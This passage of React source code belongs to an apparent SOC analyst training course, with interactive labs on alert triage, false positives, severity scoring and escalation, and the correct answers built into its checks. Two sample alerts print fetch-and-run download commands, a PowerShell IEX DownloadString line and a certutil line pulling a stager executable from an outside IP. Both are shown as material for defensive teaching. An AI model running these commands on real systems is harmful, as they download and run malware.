            className="text-xs font-bold gap-1.5 bg-primary text-white"
          >
            <Key className="w-3.5 h-3.5" />
            {decoded ? 'Hide Decoded Cleartext' : 'Decode Base64 Payload'}
          </Button>

          {decoded && (
            <span className="text-xs font-mono text-emerald-600 font-bold flex items-center gap-1">
              <CheckCircle2 className="w-3.5 h-3.5" />
              Decoded Successfully
            </span>
          )}
        </div>

        {/* Decoded Output */}
        {decoded && (
          <div className="p-4 rounded-xl bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-300 text-xs space-y-1.5 animate-fade-in">
            <strong className="text-emerald-900 dark:text-emerald-200 block font-bold">
              Decoded Command String:
            </strong>
            <code className="text-emerald-800 dark:text-emerald-300 font-mono font-bold">
              IEX (New-Object Net.WebClient).DownloadString(&apos;http://185.220.101.5/stager.exe&apos;)
            </code>
            <p className="text-muted-foreground text-[11px] pt-1">
              <strong>Analyst Assessment:</strong> Living-off-the-land PowerShell downloader reaching out to untrusted external C2 IP <code className="text-foreground">185.220.101.5</code> to drop binary executable.
            </p>
          </div>
        )}
      </div>

      {/* Parent-Child Process Hierarchy */}
      <div className="p-4 rounded-xl border bg-muted/20 text-xs space-y-2">
        <h4 className="font-bold text-foreground flex items-center gap-1.5">
          <Network className="w-3.5 h-3.5 text-primary" />
          Process Tree Anomaly Check
        </h4>
        <div className="font-mono text-[11px] space-y-1 bg-card p-3 rounded-lg border">
          <div className="text-muted-foreground">📁 explorer.exe (PID 2100)</div>
          <div className="text-muted-foreground pl-4">└─ 📄 EXCEL.EXE (PID 4812) — User opened &apos;Invoice_Q3.xlsm&apos;</div>
          <div className="text-rose-600 pl-8 font-bold">└─ ⚠️ cmd.exe (PID 4880) — Anomaly: Office app should never spawn shell!</div>
          <div className="text-rose-600 pl-12 font-bold">└─ 🚨 powershell.exe (PID 4910) — Malicious downloader active</div>
        </div>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 3, TOPIC 3.2: [Lab] 🔵 Basic Alert Triage
// Hands-on SIEM Entity Extraction & Verdict Lab
// =========================================================================
function StoryTopic32({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [selectedUser, setSelectedUser] = useState<string>('');
  const [selectedHost, setSelectedHost] = useState<string>('');
  const [selectedIp, setSelectedIp] = useState<string>('');
  const [verdict, setVerdict] = useState<'tp' | 'fp' | null>(null);
  const [submitted, setSubmitted] = useState(false);

  const isFormValid =
    selectedUser === 'jdoe-finance' &&
    selectedHost === 'WKSTN-FIN-042' &&
    selectedIp === '185.220.101.5' &&
    verdict === 'tp';

  const handleSubmit = () => {
    setSubmitted(true);
    if (isFormValid) {
      onComplete();
    }
  };

  return (
    <div className="space-y-6">
      {/* Realistic SIEM Alert Record */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-slate-950 text-white space-y-3 shadow-md font-mono text-xs">
        <div className="flex items-center justify-between border-b border-slate-800 pb-2">
          <span className="text-emerald-400 font-bold flex items-center gap-1.5">
            <Radio className="w-3.5 h-3.5 animate-pulse" />
            SIEM ALERT #ALT-4491: Obfuscated PowerShell C2 Download
          </span>
          <Badge className="bg-rose-600 text-white text-[10px]">P1 CRITICAL</Badge>
        </div>

        <div className="text-slate-300 space-y-1 leading-relaxed">
          <div><span className="text-slate-500">TIMESTAMP:</span> 2026-09-29T14:28:19Z</div>
          <div><span className="text-slate-500">EVENT_ID:</span> Sysmon 1 (Process Create)</div>
          <div><span className="text-slate-500">USER:</span> CORP\jdoe-finance</div>
          <div><span className="text-slate-500">HOSTNAME:</span> WKSTN-FIN-042</div>
          <div><span className="text-slate-500">PROCESS:</span> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</div>
          <div><span className="text-slate-500">DEST_IP:</span> 185.220.101.5 (Port 443)</div>
          <div><span className="text-slate-500">PARENT:</span> excel.exe (PID 4812)</div>
        </div>
      </div>

      {/* Hands-On Lab Workstation Form */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Crosshair className="w-4 h-4 text-blue-600" />
            [Lab] 🔵 Basic Alert Triage Workstation
          </span>
          <span className="text-muted-foreground text-[11px]">Extract the 4 Core Entities</span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
          {/* User Input */}
          <div className="space-y-1">
            <label className="font-semibold text-foreground">1. User Account:</label>
            <select
              value={selectedUser}
              onChange={(e) => setSelectedUser(e.target.value)}
              className="w-full p-2 rounded-lg border bg-muted/20 font-mono text-xs"
            >
              <option value="">-- Select User --</option>
              <option value="admin-root">CORP\admin-root</option>
              <option value="jdoe-finance">CORP\jdoe-finance</option>
              <option value="svc-backup">CORP\svc-backup</option>
            </select>
          </div>

          {/* Host Input */}
          <div className="space-y-1">
            <label className="font-semibold text-foreground">2. Affected Hostname:</label>
            <select
              value={selectedHost}
              onChange={(e) => setSelectedHost(e.target.value)}
              className="w-full p-2 rounded-lg border bg-muted/20 font-mono text-xs"
            >
              <option value="">-- Select Host --</option>
              <option value="DC-PROD-01">DC-PROD-01</option>
              <option value="WKSTN-FIN-042">WKSTN-FIN-042</option>
              <option value="FILE-SRV-09">FILE-SRV-09</option>
            </select>
          </div>

          {/* IP Input */}
          <div className="space-y-1">
            <label className="font-semibold text-foreground">3. Remote C2 IP:</label>
            <select
              value={selectedIp}
              onChange={(e) => setSelectedIp(e.target.value)}
              className="w-full p-2 rounded-lg border bg-muted/20 font-mono text-xs"
            >
              <option value="">-- Select Destination IP --</option>
              <option value="10.0.0.1">10.0.0.1 (Gateway)</option>
              <option value="185.220.101.5">185.220.101.5 (Untrusted)</option>
              <option value="8.8.8.8">8.8.8.8 (Google DNS)</option>
            </select>
          </div>
        </div>

        {/* Triage Verdict */}
        <div className="space-y-2 pt-2 border-t text-xs">
          <label className="font-bold text-foreground">4. Final Triage Verdict:</label>
          <div className="grid grid-cols-2 gap-3">
            <button
              onClick={() => setVerdict('tp')}
              className={`p-3 rounded-xl border text-left transition-all ${
                verdict === 'tp'
                  ? 'bg-rose-50 border-rose-300 dark:bg-rose-950/40 text-rose-900 dark:text-rose-200 ring-2 ring-rose-500/20'
                  : 'bg-muted/20 text-muted-foreground'
              }`}
            >
              <div className="font-bold">🛡️ True Positive (Malicious)</div>
              <div className="text-[11px] opacity-75">Active malware stager; isolate host & escalate to L2</div>
            </button>

            <button
              onClick={() => setVerdict('fp')}
              className={`p-3 rounded-xl border text-left transition-all ${
                verdict === 'fp'
                  ? 'bg-amber-50 border-amber-300 dark:bg-amber-950/40 text-amber-900 dark:text-amber-200 ring-2 ring-amber-500/20'
                  : 'bg-muted/20 text-muted-foreground'
              }`}
            >
              <div className="font-bold">✅ False Positive (Benign)</div>
              <div className="text-[11px] opacity-75">Routine expected administrative task; close alert</div>
            </button>
          </div>
        </div>

        {/* Submit & Validate Button */}
        <div className="pt-2 flex items-center justify-between">
          <Button
            size="sm"
            onClick={handleSubmit}
            className="text-xs font-bold bg-primary text-white"
          >
            Validate Triage Investigation
          </Button>

          {submitted && isFormValid && (
            <Badge className="bg-emerald-600 text-white text-xs gap-1 py-1 px-3">
              <CheckCircle2 className="w-3.5 h-3.5" />
              Lab Completed! 100% Accuracy (+60 XP)
            </Badge>
          )}

          {submitted && !isFormValid && (
            <Badge variant="outline" className="text-rose-600 bg-rose-50 border-rose-200 text-xs">
              Entities or verdict incorrect. Check the raw SIEM log!
            </Badge>
          )}
        </div>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 4, TOPIC 4.1: Expected Activity & Benign True Positives
// Comparison Matrix: IT Admin vs Threat Actor
// =========================================================================
function StoryTopic41({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [selectedCase, setSelectedCase] = useState<number>(0);
  const [interacted, setInteracted] = useState(false);

  const scenarios = [
    {
      title: 'Vulnerability Scanner Probe',
      who: 'IP 10.0.100.50 (Approved Tenable Scanner)',
      what: 'Mass SYN sweep on port 445',
      verdict: 'Expected Activity (False Positive)',
      why: 'Registered asset inventory scanner operating within approved maintenance window CHG-440.',
    },
    {
      title: 'Developer Localhost Server',
      who: 'User: dev-sarah (Frontend Engineer)',
      what: 'Node.js opens listening socket on 127.0.0.1:3000',
      verdict: 'Benign True Positive (Safe Dev Work)',
      why: 'Loopback binding only; no external network exposure; legitimate local software build.',
    },
    {
      title: 'Cold-Call AnyDesk Installation',
      who: 'User: receptionist-bob',
      what: 'AnyDesk remote tool downloaded from unclassified website',
      verdict: 'True Positive (Social Engineering Scam)',
      why: 'Bob received fake helpdesk call. Unapproved remote tool provides adversary persistent access.',
    },
  ];

  return (
    <div className="space-y-6">
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Search className="w-4 h-4 text-primary" />
            Expected vs Benign vs Malicious Activity
          </span>
          <div className="flex items-center gap-1">
            {scenarios.map((_, i) => (
              <button
                key={i}
                onClick={() => {
                  setSelectedCase(i);
                  setInteracted(true);
                }}
                className={`w-6 h-6 rounded-full text-xs font-bold transition-all ${
                  selectedCase === i ? 'bg-primary text-white shadow-xs' : 'bg-muted text-muted-foreground'
                }`}
              >
                {i + 1}
              </button>
            ))}
          </div>
        </div>

        {/* Current Scenario Card */}
        <div className="p-4 rounded-xl bg-muted/20 border text-xs space-y-2">
          <div className="flex items-center justify-between">
            <h4 className="text-sm font-bold text-foreground">{scenarios[selectedCase].title}</h4>
            <Badge variant="outline" className="font-bold text-xs">{scenarios[selectedCase].verdict}</Badge>
          </div>
          <div className="space-y-1 text-muted-foreground">
            <div><strong>Actor:</strong> {scenarios[selectedCase].who}</div>
            <div><strong>Action:</strong> {scenarios[selectedCase].what}</div>
            <div><strong>Analyst Rationale:</strong> {scenarios[selectedCase].why}</div>
          </div>
        </div>
      </div>

      {interacted && !isDone && (
        <div className="p-3 rounded-xl bg-emerald-50 border border-emerald-200 text-xs text-emerald-900 flex items-center justify-between">
          <span>Scenarios reviewed! You can now differentiate routine IT work from attacks.</span>
          <Button size="sm" onClick={onComplete} className="h-7 text-xs bg-emerald-600 hover:bg-emerald-700 text-white font-bold">
            Mark Topic Complete
          </Button>
        </div>
      )}
    </div>
  );
}

// =========================================================================
// UNIT 4, TOPIC 4.2: Detection Errors & [Lab] 🔵 False-Positive Identification
// Hands-on 3-Case Queue Review Lab
// =========================================================================
function StoryTopic42({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [answers, setAnswers] = useState<Record<number, string>>({});
  const [submitted, setSubmitted] = useState(false);

  const cases = [
    {
      id: 0,
      title: 'Alert: Nightly Robocopy on DB Server',
      detail: '`robocopy.exe E:\\DBBackups \\\\Nas01\\Backups` executed at 02:00 AM by `svc-sql-backup`.',
      correct: 'fp-expected',
      feedback: 'Correct! Approved scheduled maintenance. Tune rule to exclude `svc-sql-backup`.',
    },
    {
      id: 1,
      title: 'Alert: Inbound SYN Dropped on Port 23',
      detail: 'Firewall dropped single packet from random internet IP targeting Telnet. Zero internal response.',
      correct: 'fp-noise',
      feedback: 'Correct! Background internet noise blocked by perimeter. Tune rule to alert only on accepted packets.',
    },
    {
      id: 2,
      title: 'Alert: Certutil.exe Downloading External .EXE',
      detail: '`certutil.exe -urlcache -split http://45.142.122.9/stager.exe %TEMP%\\svchost.exe` on HR laptop.',
      correct: 'tp-malicious',
      feedback: 'Correct! True Positive living-off-the-land download. Immediate host isolation required!',
    },
  ];

  const handleSelect = (caseId: number, val: string) => {
    setAnswers((prev) => ({ ...prev, [caseId]: val }));
  };

  const isAllCorrect =
    answers[0] === 'fp-expected' &&
    answers[1] === 'fp-noise' &&
    answers[2] === 'tp-malicious';

  const handleSubmit = () => {
    setSubmitted(true);
    if (isAllCorrect) {
      onComplete();
    }
  };

  return (
    <div className="space-y-6">
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <FlaskConical className="w-4 h-4 text-blue-600" />
            [Lab] 🔵 False-Positive Identification Queue (3 Cases)
          </span>
          <span className="text-muted-foreground text-[11px]">Classify each incoming queue alert</span>
        </div>

        <div className="space-y-3">
          {cases.map((c) => (
            <div key={c.id} className="p-3.5 rounded-xl border bg-muted/20 space-y-2 text-xs">
              <div className="flex items-center justify-between">
                <h4 className="font-bold text-foreground">{c.title}</h4>
                <span className="font-mono text-[10px] text-muted-foreground">Case {c.id + 1}</span>
              </div>
              <p className="text-muted-foreground text-[11px] font-mono bg-card p-2 rounded border">
                {c.detail}
              </p>

              <div className="flex flex-wrap items-center gap-2 pt-1">
                <button
                  onClick={() => handleSelect(c.id, 'fp-expected')}
                  className={`px-2.5 py-1 rounded-lg border text-[11px] font-semibold transition-all ${
                    answers[c.id] === 'fp-expected'
                      ? 'bg-blue-600 text-white'
                      : 'bg-card text-muted-foreground'
                  }`}
                >
                  False Positive (Expected IT Activity)
                </button>
                <button
                  onClick={() => handleSelect(c.id, 'fp-noise')}
                  className={`px-2.5 py-1 rounded-lg border text-[11px] font-semibold transition-all ${
                    answers[c.id] === 'fp-noise'
                      ? 'bg-amber-600 text-white'
                      : 'bg-card text-muted-foreground'
                  }`}
                >
                  False Positive (Perimeter Noise)
                </button>
                <button
                  onClick={() => handleSelect(c.id, 'tp-malicious')}
                  className={`px-2.5 py-1 rounded-lg border text-[11px] font-semibold transition-all ${
                    answers[c.id] === 'tp-malicious'
                      ? 'bg-rose-600 text-white'
                      : 'bg-card text-muted-foreground'
                  }`}
                >
                  True Positive (Malicious Intrusion)
                </button>
              </div>
            </div>
          ))}
        </div>

        <div className="pt-2 flex items-center justify-between">
          <Button size="sm" onClick={handleSubmit} className="text-xs font-bold bg-primary text-white">
            Submit Queue Triage
          </Button>

          {submitted && isAllCorrect && (
            <Badge className="bg-emerald-600 text-white text-xs gap-1 py-1 px-3">
              <CheckCircle2 className="w-3.5 h-3.5" />
              All 3 Cases Correctly Triaged! (+60 XP)
            </Badge>
          )}

          {submitted && !isAllCorrect && (
            <Badge variant="outline" className="text-rose-600 bg-rose-50 border-rose-200 text-xs">
              One or more cases misclassified. Review carefully!
            </Badge>
          )}
        </div>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 5, TOPIC 5.1: Severity Tiers (Low, Med, High, Critical)
// Interactive SLA Countdown Matrix
// =========================================================================
function StoryTopic51({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [selectedTier, setSelectedTier] = useState<string>('p1');
  const [interacted, setInteracted] = useState(false);

  const tiers = [
    {
      id: 'p1',
      title: 'P1 - Critical Severity',
      sla: '< 15 Minutes',
      color: 'border-rose-300 bg-rose-50/50 dark:bg-rose-950/20 text-rose-900 dark:text-rose-200',
      badge: 'bg-rose-600 text-white',
      examples: 'Active ransomware on Domain Controller, root cloud breach, customer database dump.',
      action: 'Assemble emergency war room, notify CISO, invoke emergency network isolation.',
    },
    {
      id: 'p2',
      title: 'P2 - High Severity',
      sla: '< 1 Hour',
      color: 'border-amber-300 bg-amber-50/50 dark:bg-amber-950/20 text-amber-900 dark:text-amber-200',
      badge: 'bg-amber-600 text-white',
      examples: 'Malware active in RAM on CFO laptop, unauthorized admin account created.',
      action: 'Isolate host, dump volatile memory, revoke compromised credentials.',
    },
    {
      id: 'p3',
      title: 'P3 - Medium Severity',
      sla: '< 4 Hours',
      color: 'border-blue-300 bg-blue-50/50 dark:bg-blue-950/20 text-blue-900 dark:text-blue-200',
      badge: 'bg-blue-600 text-white',
      examples: 'Quarantined phishing email, suspicious login blocked by MFA, adware install.',
      action: 'Purge email from fleet mailboxes, verify user did not enter password on credential harvester.',
    },
    {
      id: 'p4',
      title: 'P4 - Low Severity',
      sla: '< 24 Hours',
      color: 'border-slate-300 bg-slate-50/50 dark:bg-slate-900/20 text-slate-900 dark:text-slate-200',
      badge: 'bg-slate-600 text-white',
      examples: 'Blocked inbound perimeter port scan, routine policy deprecation warning.',
      action: 'Batch review during regular shift hours, aggregate for monthly trend metrics.',
    },
  ];

  const currentTier = tiers.find((t) => t.id === selectedTier) || tiers[0];

  return (
    <div className="space-y-6">
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Flame className="w-4 h-4 text-primary" />
            [Demo] The Severity Matrix & SLA Countdown
          </span>
          <span className="text-muted-foreground text-[11px]">Click each tier to inspect response playbooks</span>
        </div>

        {/* 4 Tier Selectors */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
          {tiers.map((t) => (
            <button
              key={t.id}
              onClick={() => {
                setSelectedTier(t.id);
                setInteracted(true);
              }}
              className={`p-3 rounded-xl border text-center transition-all ${
                selectedTier === t.id
                  ? 'border-primary ring-2 ring-primary/20 bg-card font-bold shadow-xs'
                  : 'bg-muted/30 text-muted-foreground'
              }`}
            >
              <div className="text-xs">{t.title.split(' - ')[0]}</div>
              <div className="text-[10px] font-mono text-primary">{t.sla}</div>
            </button>
          ))}
        </div>

        {/* Selected Tier Card */}
        <div className={`p-4 rounded-xl border text-xs space-y-2 ${currentTier.color}`}>
          <div className="flex items-center justify-between">
            <span className="font-bold text-sm">{currentTier.title}</span>
            <Badge className={currentTier.badge}>{currentTier.sla} SLA</Badge>
          </div>
          <p className="text-[11px]"><strong>Typical Scenarios:</strong> {currentTier.examples}</p>
          <p className="text-[11px]"><strong>Mandated Response:</strong> {currentTier.action}</p>
        </div>
      </div>

      {interacted && !isDone && (
        <div className="p-3 rounded-xl bg-emerald-50 border border-emerald-200 text-xs text-emerald-900 flex items-center justify-between">
          <span>Severity tiers explored! You understand SLA deadlines and operational urgency.</span>
          <Button size="sm" onClick={onComplete} className="h-7 text-xs bg-emerald-600 hover:bg-emerald-700 text-white font-bold">
            Mark Topic Complete
          </Button>
        </div>
      )}
    </div>
  );
}

// =========================================================================
// UNIT 5, TOPIC 5.2: [Lab] 🔵 Severity Classification (Impact x Confidence)
// Calculator + 3 Real Incidents Lab
// =========================================================================
function StoryTopic52({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [impact, setImpact] = useState<number>(3);
  const [confidence, setConfidence] = useState<number>(3);
  const [answers, setAnswers] = useState<Record<number, string>>({});
  const [submitted, setSubmitted] = useState(false);

  // Compute calculated severity
  const score = impact * confidence;
  const computedSeverity = score >= 12 ? 'P1 - Critical' : score >= 8 ? 'P2 - High' : score >= 4 ? 'P3 - Medium' : 'P4 - Low';

  const challenges = [
    {
      id: 0,
      title: 'Challenge 1: QA Sandbox VM Mining Monero',
      detail: 'Isolated test VM with zero customer data running XMRig miner.',
      correct: 'p3',
    },
    {
      id: 1,
      title: 'Challenge 2: Periodic Beaconing from CFO Laptop',
      detail: 'Executive workstation with banking credentials beaconing to overseas IP.',
      correct: 'p2',
    },
    {
      id: 2,
      title: 'Challenge 3: Active Ransomware on Core ERP Database',
      detail: 'Volume shadow copies deleted; 50,000 files encrypted on primary manufacturing server.',
      correct: 'p1',
    },
  ];

  const handleSelect = (id: number, val: string) => {
    setAnswers((prev) => ({ ...prev, [id]: val }));
  };

  const isAllCorrect = answers[0] === 'p3' && answers[1] === 'p2' && answers[2] === 'p1';

  const handleSubmit = () => {
    setSubmitted(true);
    if (isAllCorrect) onComplete();
  };

  return (
    <div className="space-y-6">
      {/* Interactive Severity Calculator */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Sliders className="w-4 h-4 text-primary" />
            Severity Formula: Severity = Impact × Confidence
          </span>
          <Badge className="bg-primary text-white font-mono text-xs">{computedSeverity}</Badge>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
          <div className="space-y-2">
            <div className="flex items-center justify-between font-semibold">
              <span>Impact (Asset Value):</span>
              <span className="font-mono text-primary font-bold">Tier {impact} / 4</span>
            </div>
            <input
              type="range"
              min="1"
              max="4"
              value={impact}
              onChange={(e) => setImpact(parseInt(e.target.value))}
              className="w-full accent-primary cursor-pointer h-2 bg-muted rounded-lg"
            />
            <span className="text-[10px] text-muted-foreground">1: Test VM | 2: Standard Laptop | 3: Server | 4: Domain Controller</span>
          </div>

          <div className="space-y-2">
            <div className="flex items-center justify-between font-semibold">
              <span>Confidence (Detection Fidelity):</span>
              <span className="font-mono text-primary font-bold">{confidence * 25}%</span>
            </div>
            <input
              type="range"
              min="1"
              max="4"
              value={confidence}
              onChange={(e) => setConfidence(parseInt(e.target.value))}
              className="w-full accent-primary cursor-pointer h-2 bg-muted rounded-lg"
            />
            <span className="text-[10px] text-muted-foreground">25%: Single Anomaly | 50%: Suspicious | 100%: Confirmed Threat Hash</span>
          </div>
        </div>
      </div>

      {/* [Lab] 🔵 3 Incidents Classification */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <FlaskConical className="w-4 h-4 text-blue-600" />
            [Lab] 🔵 Severity Classification Challenges
          </span>
          <span className="text-muted-foreground text-[11px]">Classify each incident ticket</span>
        </div>

        <div className="space-y-3">
          {challenges.map((ch) => (
            <div key={ch.id} className="p-3.5 rounded-xl border bg-muted/20 space-y-2 text-xs">
              <h4 className="font-bold text-foreground">{ch.title}</h4>
              <p className="text-muted-foreground text-[11px]">{ch.detail}</p>
              <div className="flex items-center gap-2 pt-1">
                {['p1', 'p2', 'p3', 'p4'].map((p) => (
                  <button
                    key={p}
                    onClick={() => handleSelect(ch.id, p)}
                    className={`px-3 py-1 rounded-lg border text-xs font-bold uppercase transition-all ${
                      answers[ch.id] === p
                        ? 'bg-primary text-white shadow-xs'
                        : 'bg-card text-muted-foreground'
                    }`}
                  >
                    {p.toUpperCase()}
                  </button>
                ))}
              </div>
            </div>
          ))}
        </div>

        <div className="pt-2 flex items-center justify-between">
          <Button size="sm" onClick={handleSubmit} className="text-xs font-bold bg-primary text-white">
            Validate Classifications
          </Button>

          {submitted && isAllCorrect && (
            <Badge className="bg-emerald-600 text-white text-xs gap-1 py-1 px-3">
              <CheckCircle2 className="w-3.5 h-3.5" />
              100% Correct Severity Ratings! (+60 XP)
            </Badge>
          )}

          {submitted && !isAllCorrect && (
            <Badge variant="outline" className="text-rose-600 bg-rose-50 border-rose-200 text-xs">
              One or more tickets misclassified. Think about Impact vs Confidence!
            </Badge>
          )}
        </div>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 6, TOPIC 6.1: Tier Escalation: L1 -> L2 -> L3 Funnel
// Multi-Tier Funnel Animation & Warm Handoff Explorer
// =========================================================================
function StoryTopic61({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [routed, setRouted] = useState<Record<number, string>>({});

  const scenarios = [
    {
      id: 0,
      title: 'Alert: 4,000 Failed Logins on VPN Gateway',
      detail: 'Automated brute-force password spray coming from anonymous proxy.',
      correct: 'L1',
    },
    {
      id: 1,
      title: 'Alert: Mimikatz Memory Injection on Workstation',
      detail: 'Malware active in RAM. Suspicious service installed for persistence.',
      correct: 'L2',
    },
    {
      id: 2,
      title: 'Crisis: Domain Controller Forest Compromised via Zero-Day',
      detail: 'Adversary forged Kerberos Golden Ticket. Enterprise breach underway.',
      correct: 'L3',
    },
  ];

  const handleRoute = (id: number, tier: string) => {
    setRouted((prev) => ({ ...prev, [id]: tier }));
    if (Object.keys({ ...routed, [id]: tier }).length >= 2) {
      onComplete();
    }
  };

  return (
    <div className="space-y-6">
      {/* 3 Tier Persona Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
        <div className="p-4 rounded-xl border bg-gradient-to-br from-card to-blue-50/20 space-y-2">
          <div className="w-8 h-8 rounded-lg bg-blue-100 text-blue-700 flex items-center justify-center font-bold text-xs">L1</div>
          <h4 className="font-bold text-sm text-foreground">The Triage Sentry</h4>
          <p className="text-muted-foreground text-[11px]">24/7 radar watch. Resolves 90% of queue alerts within 15 minutes.</p>
        </div>

        <div className="p-4 rounded-xl border bg-gradient-to-br from-card to-amber-50/20 space-y-2">
          <div className="w-8 h-8 rounded-lg bg-amber-100 text-amber-700 flex items-center justify-center font-bold text-xs">L2</div>
          <h4 className="font-bold text-sm text-foreground">The Forensic Hunter</h4>
          <p className="text-muted-foreground text-[11px]">Deep host memory forensics, process reverse engineering, containment.</p>
        </div>

        <div className="p-4 rounded-xl border bg-gradient-to-br from-card to-rose-50/20 space-y-2">
          <div className="w-8 h-8 rounded-lg bg-rose-100 text-rose-700 flex items-center justify-center font-bold text-xs">L3</div>
          <h4 className="font-bold text-sm text-foreground">The CSIRT Commander</h4>
          <p className="text-muted-foreground text-[11px]">Proactive adversary hunting, zero-day analysis, enterprise war room leader.</p>
        </div>
      </div>

      {/* Interactive Router */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Users className="w-4 h-4 text-primary" />
            [Demo] Escalation Console: Route the Incident
          </span>
          <span className="text-muted-foreground text-[11px]">Execute a warm handoff to the right tier</span>
        </div>

        <div className="space-y-3">
          {scenarios.map((sc) => (
            <div key={sc.id} className="p-3.5 rounded-xl border bg-muted/20 space-y-2 text-xs">
              <h4 className="font-bold text-foreground">{sc.title}</h4>
              <p className="text-muted-foreground text-[11px]">{sc.detail}</p>
              <div className="flex items-center gap-2 pt-1">
                {['L1', 'L2', 'L3'].map((tier) => (
                  <button
                    key={tier}
                    onClick={() => handleRoute(sc.id, tier)}
                    className={`px-3 py-1 rounded-lg border text-xs font-bold transition-all ${
                      routed[sc.id] === tier
                        ? 'bg-primary text-white shadow-xs'
                        : 'bg-card text-muted-foreground'
                    }`}
                  >
                    Escalate to {tier}
                  </button>
                ))}
                {routed[sc.id] && (
                  <span className={`text-[11px] font-semibold ${
                    routed[sc.id] === sc.correct ? 'text-emerald-600' : 'text-amber-600'
                  }`}>
                    {routed[sc.id] === sc.correct ? '✓ Optimal Tier' : '⚠️ Misaligned Tier'}
                  </span>
                )}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 6, TOPIC 6.2: Specialist & Management Escalation
// Crisis Stakeholder Router (Legal, CTI, HR, Network)
// =========================================================================
function StoryTopic62({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [routed, setRouted] = useState<Record<number, string>>({});

  const events = [
    {
      id: 0,
      title: 'Extortion Demand Threatening 500,000 Customer Records',
      detail: 'Attacker demands $5M ransom; GDPR 72-hour breach disclosure law triggered.',
      correct: 'legal',
      team: 'Legal Counsel & CISO',
    },
    {
      id: 1,
      title: 'Disgruntled Senior Engineer Exfiltrating Source Code to Personal USB',
      detail: 'Internal data loss prevention (DLP) alarm flagged core IP theft.',
      correct: 'hr',
      team: 'Human Resources (HR) & Corporate Security',
    },
    {
      id: 2,
      title: 'Nation-State Custom Kernel Rootkit Attribution',
      detail: 'Implant matches proprietary toolset used exclusively by APT29 (Cozy Bear).',
      correct: 'cti',
      team: 'Cyber Threat Intelligence (CTI)',
    },
  ];

  const handleRoute = (id: number, teamKey: string) => {
    setRouted((prev) => ({ ...prev, [id]: teamKey }));
    if (Object.keys({ ...routed, [id]: teamKey }).length >= 2) {
      onComplete();
    }
  };

  return (
    <div className="space-y-6">
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Building className="w-4 h-4 text-primary" />
            Crisis Stakeholder Router (When an Incident Exits the SOC)
          </span>
          <span className="text-muted-foreground text-[11px]">Route each crisis development</span>
        </div>

        <div className="space-y-3">
          {events.map((ev) => (
            <div key={ev.id} className="p-3.5 rounded-xl border bg-muted/20 space-y-2 text-xs">
              <h4 className="font-bold text-foreground">{ev.title}</h4>
              <p className="text-muted-foreground text-[11px]">{ev.detail}</p>
              <div className="flex flex-wrap items-center gap-2 pt-1">
                <button
                  onClick={() => handleRoute(ev.id, 'legal')}
                  className={`px-2.5 py-1 rounded-lg border text-[11px] font-semibold transition-all ${
                    routed[ev.id] === 'legal' ? 'bg-primary text-white' : 'bg-card text-muted-foreground'
                  }`}
                >
                  Legal Counsel & CISO
                </button>
                <button
                  onClick={() => handleRoute(ev.id, 'hr')}
                  className={`px-2.5 py-1 rounded-lg border text-[11px] font-semibold transition-all ${
                    routed[ev.id] === 'hr' ? 'bg-primary text-white' : 'bg-card text-muted-foreground'
                  }`}
                >
                  HR & Insider Threat
                </button>
                <button
                  onClick={() => handleRoute(ev.id, 'cti')}
                  className={`px-2.5 py-1 rounded-lg border text-[11px] font-semibold transition-all ${
                    routed[ev.id] === 'cti' ? 'bg-primary text-white' : 'bg-card text-muted-foreground'
                  }`}
                >
                  Threat Intel (CTI)
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 7, TOPIC 7.1: Findings, Evidence & Timeline (UTC)
// Interactive Defanger Sandbox & Anatomy of a Ticket
// =========================================================================
function StoryTopic71({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [defanged, setDefanged] = useState(false);

  return (
    <div className="space-y-6">
      {/* Interactive IOC Defanger Tool */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
